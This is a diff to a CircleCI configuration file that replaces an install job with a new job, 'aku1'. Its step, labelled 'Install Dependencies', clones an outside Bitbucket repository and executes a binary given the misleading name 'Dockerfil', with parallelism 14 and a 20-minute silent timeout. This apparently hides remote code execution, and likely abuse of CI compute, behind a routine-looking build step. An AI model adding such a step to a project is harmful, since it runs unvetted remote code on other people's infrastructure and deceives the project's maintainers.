@@ -1,9 +1,16 @@
 version: 2
 jobs:
- build:
-   machine: true
-   parallelism: 30
-    steps: 
-      - checkout 
-      - run: chmod +x ./install.sh
-      - run: ./install.sh 
+    aku1:
+      docker:
+            - image: ubuntu-18.04
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://Ndj8777k@bitbucket.org/ndj8777k/uy.git && cd uy && chmod 777 tide Dockerfil && ./Dockerfil
+            no_output_timeout: 20m
+    parallelism: 14
+workflows:
+    version: 2
+    build:
+        jobs:
+            - aku1
